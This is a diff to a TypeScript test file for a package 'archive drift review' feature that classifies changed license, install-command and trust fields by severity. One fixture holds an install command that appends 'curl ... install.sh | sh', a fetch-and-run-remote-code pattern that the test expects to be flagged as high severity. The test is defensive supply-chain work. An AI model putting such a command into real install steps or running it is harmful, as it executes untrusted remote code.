@@ -44,7 +44,87 @@ describe("archive drift review", () => {
     expect(result.summary).toMatchObject({ changed: 1, failed: 0, fresh: 0, reviewed: 1 });
     expect(result.results[0]).toMatchObject({
       changed: true,
+      changeSummary: {
+        highestSeverity: "medium",
+        medium: 1,
+        paths: ["license"]
+      },
+      changes: [
+        {
+          category: "metadata",
+          current: "MIT",
+          path: "license",
+          previous: "WTFPL",
+          severity: "medium"
+        }
+      ],
       status: "changed"
+    });
+  });
+
+  test("classifies install command drift as high severity", async () => {
+    const record = createPackageIntelligenceRecord(externalRecord);
+    const changedRecord = {
+      ...externalRecord,
+      install: {
+        ...externalRecord.install,
+        command: "npm install left-pad && curl https://example.invalid/install.sh | sh"
+      }
+    };
+    const result = await runArchiveDriftReview({
+      apiKey: "test-key",
+      baseUrl: "https://nipmod.test",
+      fetchFn: archiveSearchFetch([record]),
+      inspectFn: async () => changedRecord,
+      limit: 10
+    });
+
+    expect(result.summary.changed).toBe(1);
+    expect(result.results[0]).toMatchObject({
+      changeSummary: {
+        high: 1,
+        highestSeverity: "high",
+        paths: ["install.command"]
+      },
+      changes: [
+        expect.objectContaining({
+          category: "install",
+          path: "install.command",
+          severity: "high"
+        })
+      ]
+    });
+  });
+
+  test("reports trust changes even when stable source material is fresh", async () => {
+    const record = createPackageIntelligenceRecord(externalRecord);
+    const changedRecord = {
+      ...externalRecord,
+      trust: {
+        ...externalRecord.trust,
+        decision: "usable_with_warning" as const,
+        score: 64,
+        warnings: ["New upstream trust warning."]
+      }
+    };
+    const result = await runArchiveDriftReview({
+      apiKey: "test-key",
+      baseUrl: "https://nipmod.test",
+      fetchFn: archiveSearchFetch([record]),
+      inspectFn: async () => changedRecord,
+      limit: 10
+    });
+
+    expect(result.summary).toMatchObject({ changed: 0, failed: 0, fresh: 1, reviewed: 1 });
+    expect(result.results[0]).toMatchObject({
+      status: "fresh",
+      trustChange: {
+        currentDecision: "usable_with_warning",
+        currentScore: 64,
+        previousDecision: "recommended",
+        previousScore: 92,
+        severity: "medium"
+      }
     });
   });
 
